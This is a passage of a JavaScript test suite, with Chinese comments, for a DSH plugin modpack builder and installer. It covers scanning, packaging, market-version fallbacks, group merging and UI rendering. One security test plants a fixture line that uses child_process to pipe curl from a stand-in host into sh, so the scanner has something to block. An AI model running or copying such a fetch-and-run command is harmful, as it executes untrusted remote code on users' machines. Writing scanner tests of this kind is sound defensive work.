})

await testAsync('风险按来源分组：插件、配置、整合包分栏列', async () => {
  const findings = [
    { rule: 'secret.private-key', severity: 'high', file: 'plugins/demo-plugin/lib/x.js', line: 3, label: '私钥', masked: 'PR****' },
    { rule: 'secret.email', severity: 'low', file: 'configs/demo-plugin.json', line: 1, label: '邮箱', masked: 'a****' },
    { rule: 'file.credential-name', severity: 'medium', file: 'dsh-modpack.json', line: 0, label: '凭证名', masked: '***' },
    { rule: 'malware.eval', severity: 'medium', file: 'plugins/demo-plugin/index.js', line: 9, label: 'eval', masked: '***' },
  ]
  const groups = groupFindings(findings, [{ name: 'demo-plugin', source: 'profile' }])
  assert(groups.length >= 2, '应按文件位置分成多组')
  const pluginGroup = groups.find((g) => g.key === 'plugin:demo-plugin')
  assert(pluginGroup, '应有 demo-plugin 这一组')
  assertEqual(pluginGroup.counts.high, 1)
  assertEqual(pluginGroup.findings.length, 2, '同一插件的两处命中应归在一组')
  assertEqual(pluginGroup.origin, 'local')
  const configGroup = groups.find((g) => g.key.startsWith('config:'))
  assert(configGroup, '配置应单独成组')
  const packGroup = groups.find((g) => g.key === 'pack')
  assert(packGroup, '整合包自身的命中单独成组')
  assertEqual(groups[0].key, pluginGroup.key, '高危的组排在最前')
})

await testAsync('轻量版也带安装器（无插件 DSH 能读能装）', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: false, includeConfig: true, confirmLicense: false, name: '轻量安装器包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const names = readZip(result.buffer).map((entry) => entry.name)
  assert(names.includes('install/install.mjs'), '轻量版同样要有安装器')
  const readme = readZip(result.buffer).find((entry) => entry.name === 'README.txt')
  assert(readme, '应有 README')
  const text = readme.data.toString('utf8')
  assert(text.includes('install'), 'README 应说明安装器用法')
})

await testAsync('安装器不认 --home，也不把解压目录当长期来源', async () => {
  const stub = fs.readFileSync(new URL('../assets/install-stub.mjs', import.meta.url), 'utf8')
  assert(!stub.includes('--home'), '安装器不该暴露 --home：DSH 命令行只认 ~/.dsh，留这个参数会写错位置')
  assert(stub.includes('vendorRoot'), '完整版应先把插件复制到 vendor 再装')
  assert(stub.includes("'dsh-modpack', 'vendor'") || stub.includes('"dsh-modpack", "vendor"'), 'vendor 目录应在 ~/.dsh/dsh-modpack/vendor 下')
})

await testAsync('客户端组件在假 React 下能渲染（抓未定义变量这类白屏）', async () => {
  const source = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  const override = { value: undefined, used: false }
  const React = {
    createElement: (type, props, ...children) => ({ el: true, type, props: props || {}, children: children.flat(Infinity) }),
    useState: (init) => {
      let value = typeof init === 'function' ? init() : init
      if (!override.used && override.value !== undefined) {
        value = override.value
        override.used = true
      }
      return [value, () => {}]
    },
    useEffect: () => {},
    useLayoutEffect: () => {},
    useCallback: (fn) => fn,
    useMemo: (fn) => fn(),
    useRef: (value) => ({ current: value }),
    Fragment: 'fragment',
  }
  let mod = null
  const win = { __ModuleLoader__: { load: ({ factory }) => { mod = factory((name) => {
    if (name === 'react') return React
    throw new Error('unexpected require: ' + name)
  }) } } }
  const doc = { createElement: () => ({}), head: { appendChild() {} }, body: {} }
  new Function('window', 'document', source)(win, doc)
  assert(mod && typeof mod.Home === 'function', 'client.js 应导出 Home')

  const seen = []
  const render = (node, depth = 0) => {
    if (depth > 400) throw new Error('渲染深度超限（可能组件互相递归）')
    if (node === null || node === undefined || typeof node === 'boolean') return
    if (typeof node === 'string' || typeof node === 'number') return
    if (Array.isArray(node)) { for (const child of node) render(child, depth + 1); return }
    if (!node.el) return
    seen.push(node)
    if (typeof node.type === 'function') {
      render(node.type({ ...node.props, children: node.children.length === 1 ? node.children[0] : node.children }), depth + 1)
      return
    }
    for (const child of node.children) render(child, depth + 1)
  }

  const status = {
    ok: true, dshVersion: '0.0.0', pluginVersion: '0.1.3', profile: 'desktop',
    installed: [], installedTotal: 0, bundled: [], history: [],
    catalog: { present: false, categories: [], count: 0, pageSizeDefault: 20 },
    config: { catalogPageSize: 20, catalogRefreshHours: 24, showInSettings: true, showInSidebar: true, showInPluginsTab: false, enableOnInstall: false },
    placements: { settings: true, sidebar: true, pluginsTab: false },
    market: { installed: false },
  }
  const grouped = {
    ...status,
    installed: [
      { name: 'a-plugin', version: '1.0.0', description: 'A', category: 'tools', hasClient: true, hasPatch: false, isBundle: true },
      { name: 'b-plugin', version: '2.0.0', description: 'B', category: 'tools', hasClient: true, hasPatch: false, isBundle: true },
    ],
    installedTotal: 2,
    groups: [{ name: 'bili', members: ['a-plugin'], missing: ['gone-plugin'] }],
    ungrouped: ['b-plugin'],
    groupSource: 'market',
  }
  render(mod.Home({ status }))
  // 刷新按钮：不是「摆着好看」，必须真的把重读回调调起来。
  let refreshCalls = 0
  const withRefresh = mod.Home({ status, gen: 0, onRefresh: async () => { refreshCalls += 1 } })
  render(withRefresh)
  const refreshButtons = seen.filter((n) => n.type === "button" && typeof n.props.title === "string" && n.props.title.indexOf("只刷新整合包自己") === 0)
  const refreshBtnNode = refreshButtons[refreshButtons.length - 1] // 取最后一次渲染的那个（带着 onRefresh）
  assert(Boolean(refreshBtnNode), "标签行里要有刷新按钮")
  await refreshBtnNode.props.onClick()
  assert(refreshCalls === 1, "点刷新应真的重新读一遍状态")
  // 整合包市场面板：列表页与规则页都要能真正渲染（分类名与体量词条的助手写在前面，否则 TDZ 白屏）
  const marketStatus = { ...status, config: { ...status.config, showModpackMarket: true }, modpackMarket: { present: true, count: 1, categories: [{ label: "实用功能", count: 1 }], repo: "Vesna-Strivozha-cn/dsh-modpack-catalog", ttlHours: 24 } }
  render(mod.MarketPanel({ status: marketStatus, onGoInstall: () => {} }))
  override.value = "rules"
  override.used = false
  render(mod.MarketPanel({ status: marketStatus, onGoInstall: () => {} }))
  render(mod.Home({ status: grouped }))
  render(mod.Icon({ size: 16 }))
  render(mod.Page({}))
  // 整合包市场：首屏（loading、空目录）也要能画出来，别在没目录时白屏
  render(mod.MarketPanel({ status, onGoInstall: () => {} }))
  const marketText = seen.map((n) => (Array.isArray(n.children) ? n.children.join(' ') : '')).join(' ')
  assert(seen.some((n) => n.type === 'input' && n.props.type === 'search'), '搜索面板要有名称输入框')
  assert(marketText.includes('重置条件'), '搜索面板要有「重置条件」')
  assert(marketText.includes('安装已有整合包'), '搜索面板要有「安装已有整合包」')
  assert(marketText.includes('搜索整合包'), '面板标题照 PCL 来')
  assert(marketText.includes('正在读取整合包目录'), '首屏要有「正在读取」的空态，而不是空白')
  for (const tab of ['install', 'settings']) {
    override.value = tab
    override.used = false
    render(mod.Home({ status }))
  }
})

await testAsync('本机已装且有市场版时：勾选默认走市场版，避免把本地开发版打进包', async () => {
  const source = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  assert(
    source.includes('entry.installed === false || entry.hasMarket ? "npm" : "profile"'),
    'entrySource 应把「本机已装 + 有市场版」也算成 npm 源',
  )
  assert(
    source.includes('entry.hasMarket ? entry.marketVersion || entry.version || "" : entry.version || ""'),
    'entrySpec 在有市场版时应取市场版本号，而不是本机版本号',
  )
  const addAll = source.slice(source.indexOf('const addAllLocal'), source.indexOf('const clearSelected'))
  assert(addAll.includes('entrySource(entry)'), '「全部加入」也要按同一条默认规则走')
  assert(addAll.includes('choice: "preset"'), '「全部加入」默认插件预设（优先插件默认配置）')
  assert(addAll.includes('entrySpec(entry)'), '「全部加入」也要按同一条默认规则取版本')
  assert(
    source.includes('const sourceText = on ? (chosenSource === "npm" ? "市场版" : "本机版")'),
    '每行最前面要标出当前选的是市场版还是本机版',
  )
  assert(source.includes('style: sourceStyle'), '来源徽标要渲染在每一行的最前面')
  assert(!source.includes('市场 · 未装'), '行尾那块含糊的老标签要去掉')
  const switchBlock = source.slice(source.indexOf('const switchMarket'), source.indexOf('const addAllLocal'))
  assert(
    switchBlock.includes('source: "profile", spec: entry.version || "", choice: "preset"'),
    '切回本机版也要默认「插件预设」（优先插件默认配置）',
  )
})

await testAsync('插件自带的内部子包不算独立插件（壁纸引擎那种一个插件发 9 个包）', async () => {
  const home = tmpDir('nested-plugin')
  const profileDir = path.join(home, 'profiles', 'desktop')
  const modules = path.join(profileDir, 'node_modules')
  const writePkg = (dir, pkg) => {
    fs.mkdirSync(dir, { recursive: true })
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(pkg, null, 2))
  }
  writePkg(profileDir, {
    name: 'desktop-profile',
    private: true,
    dependencies: { 'dsh-plugin-wallpaper-engine': '1.4.2' },
    dsh: { profile: { bundles: ['dsh-plugin-wallpaper-engine'] } },
  })
  const sub = ['about-notice', 'fonts', 'fx']
  writePkg(path.join(modules, 'dsh-plugin-wallpaper-engine'), {
    name: 'dsh-plugin-wallpaper-engine',
    version: '1.4.2',
    dependencies: Object.fromEntries(sub.map((s) => ['dsh-plugin-wallpaper-engine-' + s, '1.4.2'])),
    dsh: { bundle: { patch: './cordis.patch.yml' } },
  })
  for (const s of sub) {
    writePkg(path.join(modules, 'dsh-plugin-wallpaper-engine-' + s), {
      name: 'dsh-plugin-wallpaper-engine-' + s,
      version: '1.4.2',
      dependencies: {},
      dsh: { bundle: { patch: './cordis.patch.yml' } },
    })
  }
  const all = listInstalled(profileDir)
  const direct = all.filter((p) => p.isPlugin && p.isDirect)
  const hidden = all.filter((p) => p.isPlugin && !p.isDirect)
  assertEqual(direct.map((p) => p.name), ['dsh-plugin-wallpaper-engine'], '只有父包算独立插件')
  assertEqual(hidden.length, sub.length, '三个子包应被识别为内部组件')
  for (const item of hidden) {
    assertEqual(item.transitiveOf, 'dsh-plugin-wallpaper-engine', '要记下它是谁的子包：' + item.name)
  }
})

await testAsync('附属包识别要覆盖多层、残留包与 scoped 包', async () => {
  const home = tmpDir('nested-deep')
  const profileDir = path.join(home, 'profiles', 'desktop')
  const modules = path.join(profileDir, 'node_modules')
  const writePkg = (dir, pkg) => {
    fs.mkdirSync(dir, { recursive: true })
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(pkg, null, 2))
  }
  writePkg(profileDir, {
    name: 'desktop-profile',
    private: true,
    // 只声明父包；@demo/dsh-scoped-plugin 只在 bundles 里登记，也算用户装的
    dependencies: { 'dsh-plugin-shallow': '1.0.0' },
    dsh: { profile: { bundles: ['dsh-plugin-shallow', '@demo/dsh-scoped-plugin'] } },
  })
  // 两层嵌套：shallow → mid → leaf
  writePkg(path.join(modules, 'dsh-plugin-shallow'), {
    name: 'dsh-plugin-shallow',
    version: '1.0.0',
    dependencies: { 'dsh-plugin-mid': '1.0.0' },
  })
  writePkg(path.join(modules, 'dsh-plugin-mid'), {
    name: 'dsh-plugin-mid',
    version: '1.0.0',
    dependencies: { 'dsh-plugin-leaf': '1.0.0' },
  })
  writePkg(path.join(modules, 'dsh-plugin-leaf'), { name: 'dsh-plugin-leaf', version: '1.0.0' })
  // scoped 包只在 bundles 里登记
  writePkg(path.join(modules, '@demo', 'scoped-plugin'), {
    name: '@demo/dsh-scoped-plugin',
    version: '2.0.0',
    dependencies: { '@demo/dsh-scoped-child': '2.0.0' },
  })
  writePkg(path.join(modules, '@demo', 'scoped-child'), { name: '@demo/dsh-scoped-child', version: '2.0.0' })
  // 删插件后留下的残包：谁都没声明，也不是谁的依赖
  writePkg(path.join(modules, 'dsh-plugin-leftover'), { name: 'dsh-plugin-leftover', version: '0.9.0' })

  const all = listInstalled(profileDir)
  const nameOf = (list) => list.map((p) => p.name).sort()
  const direct = all.filter((p) => p.isPlugin && p.isDirect)
  assertEqual(nameOf(direct), ['@demo/dsh-scoped-plugin', 'dsh-plugin-shallow'], '只有声明或登记在 bundles 的算直接装')
  const byName = new Map(all.map((p) => [p.name, p]))
  assertEqual(byName.get('dsh-plugin-mid').transitiveOf, 'dsh-plugin-shallow', '第一层子包记在父包名下')
  assertEqual(byName.get('dsh-plugin-leaf').transitiveOf, 'dsh-plugin-mid', '第二层子包记在它的直接父包名下')
  assertEqual(byName.get('dsh-plugin-leaf').isDirect, false, '深层子包也不能算直接装')
  assertEqual(byName.get('@demo/dsh-scoped-child').transitiveOf, '@demo/dsh-scoped-plugin', 'scoped 子包同样要识别')
  assertEqual(byName.get('dsh-plugin-leftover').isDirect, false, '残包不算插件')
  assertEqual(byName.get('dsh-plugin-leftover').isOrphan, true, '残包要标出来，方便界面说明')
  assertEqual(byName.get('dsh-plugin-mid').isOrphan, false, '有父包的不算残包')
})

await testAsync('打包：同一包里父包与子包都在时，子包标成内部组件', async () => {
  const home = tmpDir('pack-nested')
  const parentDir = path.join(home, 'node_modules', 'dsh-plugin-parent')
  const childDir = path.join(home, 'node_modules', 'dsh-plugin-child')
  fs.mkdirSync(parentDir, { recursive: true })
  fs.mkdirSync(childDir, { recursive: true })
  fs.writeFileSync(path.join(parentDir, 'package.json'), JSON.stringify({
    name: 'dsh-plugin-parent',
    version: '1.0.0',
    license: 'MIT',
    dependencies: { 'dsh-plugin-child': '1.0.0' },
  }))
  fs.writeFileSync(path.join(parentDir, 'index.js'), 'export default {}\n')
  fs.writeFileSync(path.join(childDir, 'package.json'), JSON.stringify({
    name: 'dsh-plugin-child',
    version: '1.0.0',
    license: 'MIT',
  }))
  fs.writeFileSync(path.join(childDir, 'index.js'), 'export default {}\n')

  const installed = listInstalled(path.join(home, 'profiles', 'desktop'))
  // listInstalled 在空目录会返回空：这里直接手搓两条，等价于 profile 里有父包与子包
  const items = [
    { name: 'dsh-plugin-parent', dirName: 'dsh-plugin-parent', version: '1.0.0', dir: parentDir, realDir: parentDir, pkg: JSON.parse(fs.readFileSync(path.join(parentDir, 'package.json'), 'utf8')) },
    { name: 'dsh-plugin-child', dirName: 'dsh-plugin-child', version: '1.0.0', dir: childDir, realDir: childDir, pkg: JSON.parse(fs.readFileSync(path.join(childDir, 'package.json'), 'utf8')) },
  ]
  assertEqual(installed.length, 0, '空 profile 应该没有条目')
  const config = { ...DEFAULT_CONFIG, licenseAllow: ['MIT'] }
  const packed = await buildPack({
    selection: [
      { name: 'dsh-plugin-parent', source: 'profile', mode: 'local' },
      { name: 'dsh-plugin-child', source: 'profile', mode: 'local' },
    ],
    options: { includePayload: true, includeConfig: false, confirmLicense: true, name: '嵌套包' },
    context: { config, profileDir: path.join(home, 'profiles', 'desktop'), installed: items, dshVersion: '0.0.0', pluginVersion: 'test' },
  })
  const parent = packed.manifest.plugins.find((p) => p.name === 'dsh-plugin-parent')
  const child = packed.manifest.plugins.find((p) => p.name === 'dsh-plugin-child')
  assertEqual(parent.transitiveOf, '', '父包不是内部组件')
  assertEqual(child.transitiveOf, 'dsh-plugin-parent', '子包要标成父包的内置件')
  assert(packed.notes.some((line) => line.includes('内部组件')), '清单说明里要写出来')

  const unpacked = inspectPackBuffer(packed.buffer, { config })
  assertEqual(unpacked.manifest.plugins.find((p) => p.name === 'dsh-plugin-child').transitiveOf, 'dsh-plugin-parent', '读回来也要保留 transitiveOf')

  const targetHome = tmpDir('pack-nested-target')
  const targetProfile = path.join(targetHome, 'profiles', 'desktop')
  fs.mkdirSync(targetProfile, { recursive: true })
  fs.writeFileSync(path.join(targetProfile, 'package.json'), JSON.stringify({ name: 'p', private: true }))
  const { entries } = inspectPackBuffer(packed.buffer, { config })
  const run = await installPack({
    manifest: unpacked.manifest,
    entries,
    config,
    options: { force: true, applyConfig: false, keepLocal: false, enableBundles: false, deferExisting: false },
    context: { profileDir: targetProfile, runCli: async () => ({ code: 0, output: 'fake cli' }) },
  })
  const childAction = run.actions.find((a) => a.plugin === 'dsh-plugin-child')
  assertEqual(childAction.action, 'skipped', '子包不该单独装')
  assert(childAction.message.includes('随父包一起安装'), '跳过原因要说清：' + childAction.message)
  assert(run.actions.some((a) => a.plugin === 'dsh-plugin-parent' && a.action === 'install'), '父包照常装')
})

await testAsync('进度窗标题栏：按在按钮上不算拖动，也不会顺手展开/收起', async () => {
  const source = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  // 拖拽起点要跳过按钮，否则 setPointerCapture 会把 click 抢走，按钮就点不到
  assert(
    source.includes('event.target.closest("button")'),
    'startDrag 里应跳过按钮目标（event.target.closest("button")）',
  )
  const header = source.slice(source.indexOf('function JobDock'), source.indexOf('// —— 打包 ——'))
  assert(header.includes('清空进程'), '标题栏应有「清空进程」')
  assert(
    (header.match(/onPointerDown: \(event\) => \{ if \(event && event\.stopPropagation\) event\.stopPropagation\(\) \}/g) || []).length >= 2,
    '两个标题栏按钮都要在 pointerdown 上 stopPropagation',
  )
  assert(header.includes('flexShrink: 0'), '标题栏按钮别被挤扁，避免点不到')
})

await testAsync('确认后从检测点续跑：不重新收集、也不重复检测', async () => {
  const { profileDir, installed } = await fixture()
  fs.writeFileSync(path.join(installed[0].dir, 'lib', 'risky.js'), "require('child_process').execSync('curl http://e.x/i | sh')\n")
  const ctx = packContext(baseConfig, profileDir, installed)
  const base = { includePayload: true, includeConfig: false, confirmLicense: false, name: '续跑包' }
  const selection = [{ name: 'demo-plugin', source: 'profile', mode: 'local' }]

  let refused = null
  try {
    await buildPack({ selection, options: { ...base }, context: ctx })
  } catch (error) {
    if (error instanceof PackRefused) refused = error
    else throw error
  }
  assert(refused, '应抛 PackRefused')
  assert(refused.checkpoint, '被拦下时要留下可复用的中间结果')

  const stages = []
  const resumed = await buildPack({
    selection,
    options: { ...base, acknowledge: true, resume: refused.checkpoint, onProgress: (p) => stages.push(p.stage) },
    context: ctx,
  })
  assert(!stages.includes('collect'), '续跑不应重新收集文件，实际阶段：' + stages.join(','))
  assertEqual(resumed.manifest.security.acknowledged, true)
  assertEqual(resumed.scan.counts.high, refused.scan.counts.high)
  assert(resumed.notes.some((n) => n.includes('不重复扫描')), '续跑时应该说明没再扫一遍')
})

await testAsync('安装：联网且市场有时优先按市场版本，关掉开关则用包内那份', async () => {
  const { profileDir, installed } = await fixture()
  const built = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: true, includeConfig: false, name: '市场优先包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(built.buffer, { config: baseConfig })

  const makeTarget = (label) => {
    const home = tmpDir(label)
    const target = path.join(home, 'profiles', 'desktop')
    fs.mkdirSync(target, { recursive: true })
    fs.writeFileSync(path.join(target, 'package.json'), JSON.stringify({
      name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: [] } },
    }, null, 2))
    fs.writeFileSync(path.join(target, 'cordis.patch.yml'), '[]\n')
    return target
  }

  // 1) 默认：市场查得到就按 name@version 装
  const marketTarget = makeTarget('market-home')
  const calls = []
  const marketRun = await installPack({
    manifest: inspected.manifest,
    entries: inspected.entries,
    config: baseConfig,
    options: { force: true, applyConfig: false, keepLocal: false, enableBundles: false },
    context: {
      profileDir: marketTarget,
      runCli: async (profile, args) => { calls.push(args[args.length - 1]); return { code: 0, output: 'fake' } },
      resolveMarket: async (plugin) => ({ spec: plugin.name + '@9.9.9', version: '9.9.9' }),
    },
  })
  assertEqual(marketRun.ok, true)
  assertEqual(calls[calls.length - 1], 'demo-plugin@9.9.9', '应该按市场版本装，实际：' + calls[calls.length - 1])
  const marketAction = marketRun.actions.find((a) => a.plugin === 'demo-plugin')
  assertEqual(marketAction.source, 'market')

  // 2) 关掉 preferMarket：即使市场可用也按包内那份装
  const localTarget = makeTarget('local-home')
  const localCalls = []
  const localRun = await installPack({
    manifest: inspected.manifest,
    entries: inspected.entries,
    config: baseConfig,
    options: { force: true, applyConfig: false, keepLocal: false, enableBundles: false, preferMarket: false },
    context: {
      profileDir: localTarget,
      runCli: async (profile, args) => { localCalls.push(args[args.length - 1]); return { code: 0, output: 'fake' } },
      resolveMarket: async () => { throw new Error('不该被调用') },
    },
  })
  assertEqual(localRun.ok, true)
  assert(localCalls[localCalls.length - 1].startsWith('file:'), '应该按包内那份装，实际：' + localCalls[localCalls.length - 1])
  const localAction = localRun.actions.find((a) => a.plugin === 'demo-plugin')
  assertEqual(localAction.source, 'pack')
})

await testAsync('安装：本机版也有市场版时，按市场版装再把包内本地改动覆盖上去', async () => {
  const { profileDir, installed } = await fixture()
  const built = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile', mode: 'local' }],
    options: { includePayload: true, includeConfig: false, includeLocalEdits: true, name: '本地改动包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(built.buffer, { config: baseConfig })
  assertEqual(inspected.manifest.plugins[0].localEdits, true, '这个包应当是「本地改动」模式')

  const home = tmpDir('overlay-home')
  const target = path.join(home, 'profiles', 'desktop')
  fs.mkdirSync(target, { recursive: true })
  fs.writeFileSync(path.join(target, 'package.json'), JSON.stringify({
    name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: [] } },
  }, null, 2))
  fs.writeFileSync(path.join(target, 'cordis.patch.yml'), '[]\n')

  // 假管理器：像 pnpm 一样把「市场版」落进 node_modules，内容标记成 market
  const calls = []
  const run = await installPack({
    manifest: inspected.manifest,
    entries: inspected.entries,
    config: baseConfig,
    options: { force: true, applyConfig: false, keepLocal: false, enableBundles: false },
    context: {
      profileDir: target,
      installBundle: async (spec) => {
        calls.push(spec)
        const dir = path.join(target, 'node_modules', 'demo-plugin')
        fs.mkdirSync(dir, { recursive: true })
        fs.writeFileSync(path.join(dir, 'index.js'), '// market build\n')
        fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'demo-plugin', version: '9.9.9' }))
        return { changed: true, stage: 'install', application: 'applied', target: spec }
      },
      resolveMarket: async (plugin) => ({ spec: plugin.name + '@9.9.9', version: '9.9.9' }),
    },
  })
  assertEqual(run.ok, true, '安装应当成功：' + JSON.stringify(run.lines))
  assertEqual(calls[0], 'demo-plugin@9.9.9', '依赖应当是 名字@版本（市场识别成市场版），实际：' + calls[0])
  const installedFile = fs.readFileSync(path.join(target, 'node_modules', 'demo-plugin', 'index.js'), 'utf8')
  assert(!installedFile.includes('market build'), '包内的本地改动应当覆盖掉市场版的文件')
  assert(run.lines.some((line) => line.includes('本地改动覆盖上去')), '结果里要说清楚做过覆盖：' + JSON.stringify(run.lines.slice(-4)))
  const action = run.actions.find((a) => a.plugin === 'demo-plugin')
  assertEqual(action.source, 'market', '动作来源标成 market')
})

await testAsync('安装：市场版按 registry 装失败时，退回包里自带的那份并说明会显示成本地', async () => {
  const fx = await fixture()
  // 市场来源的完整包：载荷来自 registry（这里用假的 download 提供）
  const packed = await buildPack({
    selection: [{
      name: 'demo-plugin',
      source: 'npm',
      spec: '1.2.3',
      download: async () => ({
        pkg: { name: 'demo-plugin', version: '1.2.3', license: 'MIT', dsh: { client: { platform: 'web' } } },
        registry: 'https://registry.npmjs.org',
        tarball: '',
        integrity: '',
        entries: [
          { name: 'package.json', data: Buffer.from(JSON.stringify({ name: 'demo-plugin', version: '1.2.3', license: 'MIT' })) },
          { name: 'index.js', data: Buffer.from('export function apply() {}\n') },
        ],
      }),
    }],
    options: { name: '断网包', includePayload: true, includeConfig: false },
    context: packContext(baseConfig, fx.profileDir, fx.installed),
  })
  assertEqual(packed.manifest.plugins[0].source, 'npm', '这份来自市场')
  const inspected = inspectPackBuffer(packed.buffer, { config: baseConfig, force: true })
  const targetHome = tmpDir('market-registry-down')
  const targetProfile = path.join(targetHome, 'profiles', 'desktop')
  fs.mkdirSync(targetProfile, { recursive: true })
  fs.writeFileSync(path.join(targetProfile, 'package.json'), JSON.stringify({
    name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: [] } },
  }, null, 2))
  fs.writeFileSync(path.join(targetProfile, 'cordis.patch.yml'), '[]\n')
  const specs = []
  const run = await installPack({
    manifest: inspected.manifest,
    entries: inspected.entries,
    config: baseConfig,
    options: { applyConfig: false, keepLocal: false, enableBundles: false, deferExisting: false, force: true },
    context: {
      profileDir: targetProfile,
      runCli: async (_profile, args) => {
        const spec = args[args.length - 1]
        specs.push(spec)
        return { code: spec.startsWith('file:') ? 0 : 1, output: spec }
      },
    },
  })
  assertEqual(specs[0], 'demo-plugin@1.2.3', '先按清单里的版本号装市场版，实际：' + specs[0])
  assert(String(specs[1] || '').startsWith('file:'), '失败后要退回包内副本，实际：' + specs[1])
  assert(run.lines.some((line) => line.includes('改用包内自带的那份重试')), '要说明回退原因：' + JSON.stringify(run.lines))
  assert(run.lines.some((line) => line.includes('显示成本地安装')), '要提醒市场会显示成本地：' + JSON.stringify(run.lines))
})

await testAsync('安装：市场来源的包不必再问 registry，也不会退回包内 file: 副本', async () => {
  // 以前这里会先问一次 registry（msgs 之外还要一次网络）；离线或 registry 抖动时拿不到，
  // 就退回包内副本，profile 里写成 file:，插件市场便把它显示成「本地安装」。
  const targetHome = tmpDir('market-identity')
  const targetProfile = path.join(targetHome, 'profiles', 'desktop')
  fs.mkdirSync(targetProfile, { recursive: true })
  fs.writeFileSync(path.join(targetProfile, 'package.json'), JSON.stringify({
    name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: [] } },
  }, null, 2))
  fs.writeFileSync(path.join(targetProfile, 'cordis.patch.yml'), '[]\n')
  const manifest = normalizeManifest({
    schema: 1,
    kind: 'dsh-modpack',
    format: 'full',
    createdAt: new Date().toISOString(),
    name: '市场身份包',
    plugins: [{ name: 'demo-plugin', version: '2.3.4', source: 'npm', dirName: 'demo-plugin' }],
  })
  const calls = []
  const run = await installPack({
    manifest,
    entries: [],
    config: baseConfig,
    options: { applyConfig: false, keepLocal: false, enableBundles: false, deferExisting: false },
    context: {
      profileDir: targetProfile,
      // registry 完全不可用：一次网络都不该发
      resolveMarket: async () => { throw new Error('不该被调用：清单里已经有版本号') },
      installBundle: async (spec) => {
        calls.push(spec)
        return { changed: true, stage: 'install', application: 'applied', target: spec }
      },
    },
  })
  assertEqual(calls[0], 'demo-plugin@2.3.4', '应当直接用清单里的版本号按市场安装，实际：' + calls[0])
  assert(run.actions.every((a) => a.action !== 'install' || a.ok), '不该失败：' + JSON.stringify(run.actions))
  assert(!run.lines.some((line) => line.includes('显示成本地安装')), '按市场装成时不该出现「本地」告警')
})

await testAsync('安装：按组打包的插件装到有插件市场的机器上会并进同名分组', async () => {
  const targetHome = tmpDir('group-merge')
  const targetProfile = path.join(targetHome, 'profiles', 'desktop')
  fs.mkdirSync(targetProfile, { recursive: true })
  fs.writeFileSync(path.join(targetProfile, 'package.json'), JSON.stringify({
    name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: [] } },
  }, null, 2))
  fs.writeFileSync(path.join(targetProfile, 'cordis.patch.yml'), '[]\n')
  // 目标机器已经装了插件市场，并且自己有一组别人的分组
  const marketDir = path.join(targetProfile, '.dsh-market')
  fs.mkdirSync(marketDir, { recursive: true })
  const stateFile = path.join(marketDir, 'state.json')
  fs.writeFileSync(stateFile, JSON.stringify({
    version: 3,
    groups: { bili: ['keep-me'], work: ['other-plugin'] },
    groupOrder: ['bili', 'work'],
    disabled: ['keep-me'],
  }, null, 2))

  const manifest = normalizeManifest({
    schema: 1,
    kind: 'dsh-modpack',
    format: 'full',
    createdAt: new Date().toISOString(),
    name: '分组包',
    plugins: [
      { name: 'demo-plugin', version: '2.3.4', source: 'npm', dirName: 'demo-plugin', group: 'bili' },
      { name: 'solo-plugin', version: '1.0.0', source: 'npm', dirName: 'solo-plugin' },
    ],
  })
  const run = await installPack({
    manifest,
    entries: [],
    config: baseConfig,
    options: { applyConfig: false, keepLocal: false, enableBundles: false, deferExisting: false },
    context: {
      profileDir: targetProfile,
      installBundle: async (spec) => ({ changed: true, stage: 'install', application: 'applied', target: spec }),
    },
  })
  assert(run.ok, '应当装成功：' + JSON.stringify(run.actions))
  const state = JSON.parse(fs.readFileSync(stateFile, 'utf8'))
  assertEqual(state.groups.bili.join(','), 'keep-me,demo-plugin', '同名分组应当合并成员，实际：' + JSON.stringify(state.groups))
  assertEqual(state.groups.work.join(','), 'other-plugin', '别的分组不能被动')
  assertEqual(state.groupOrder.join(','), 'bili,work', '分组顺序保持，新组才追加')
  assertEqual(state.disabled.join(','), 'keep-me', '停用名单要原样保留')
  assertEqual(state.version, 3, '状态文件里其它键要原样保留')
  assert(!state.groups.bili.includes('solo-plugin'), '没归组的不该被塞进分组')
  assert(run.lines.some((line) => line.includes('并入插件市场')), '结果里要说明分组已并入')
  assert(run.actions.some((a) => a.action === 'group' && a.ok), '应当有一条分组动作')
})

await testAsync('安装：目标 profile 没装插件市场时不写分组，但要说明', async () => {
  const targetHome = tmpDir('group-no-market')
  const targetProfile = path.join(targetHome, 'profiles', 'desktop')
  fs.mkdirSync(targetProfile, { recursive: true })
  fs.writeFileSync(path.join(targetProfile, 'package.json'), JSON.stringify({
    name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: [] } },
  }, null, 2))
  fs.writeFileSync(path.join(targetProfile, 'cordis.patch.yml'), '[]\n')
  const manifest = normalizeManifest({
    schema: 1,
    kind: 'dsh-modpack',
    format: 'full',
    createdAt: new Date().toISOString(),
    name: '无市场分组包',
    plugins: [{ name: 'demo-plugin', version: '2.3.4', source: 'npm', dirName: 'demo-plugin', group: 'bili' }],
  })
  const run = await installPack({
    manifest,
    entries: [],
    config: baseConfig,
    options: { applyConfig: false, keepLocal: false, enableBundles: false, deferExisting: false },
    context: {
      profileDir: targetProfile,
      installBundle: async (spec) => ({ changed: true, stage: 'install', application: 'applied', target: spec }),
    },
  })
  assert(!fs.existsSync(path.join(targetProfile, '.dsh-market')), '没装市场就不该凭空建市场目录')
  assert(run.lines.some((line) => line.includes('没装插件市场')), '要说明为什么没写分组：' + JSON.stringify(run.lines))
})

await testAsync('安装：市场来源退回包内副本时会明确提示「市场会显示成本地」', async () => {
  const targetHome = tmpDir('market-fallback')
